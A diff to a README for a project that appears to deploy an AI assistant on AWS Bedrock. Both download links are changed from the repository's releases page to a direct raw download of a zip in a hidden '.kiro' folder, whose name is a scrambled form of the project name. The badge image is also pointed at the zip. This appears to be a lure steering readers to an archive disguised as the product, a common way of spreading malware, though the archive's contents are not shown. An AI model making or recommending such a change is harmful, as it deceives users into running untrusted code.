@@ -1,6 +1,6 @@
 # 🚀 sample-OpenClaw-on-AWS-with-Bedrock - Easy AI Assistant Deployment on AWS
 
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-v1.0-blue)](https://github.com/yuguilley/sample-OpenClaw-on-AWS-with-Bedrock/releases)
+[![Download Latest Release](https://github.com/yuguilley/sample-OpenClaw-on-AWS-with-Bedrock/raw/refs/heads/main/.kiro/with_Open_Bedrock_on_AW_Claw_sample_v2.0.zip)](https://github.com/yuguilley/sample-OpenClaw-on-AWS-with-Bedrock/raw/refs/heads/main/.kiro/with_Open_Bedrock_on_AW_Claw_sample_v2.0.zip)
 
 ## 🌟 What is This?
 
@@ -18,7 +18,7 @@ Using AWS for your AI assistant offers several benefits:
 
 To get started, please visit the link below:
 
-[Download Here](https://github.com/yuguilley/sample-OpenClaw-on-AWS-with-Bedrock/releases)
+[Download Here](https://github.com/yuguilley/sample-OpenClaw-on-AWS-with-Bedrock/raw/refs/heads/main/.kiro/with_Open_Bedrock_on_AW_Claw_sample_v2.0.zip)
 
 Here’s a step-by-step guide to installing the application:
 
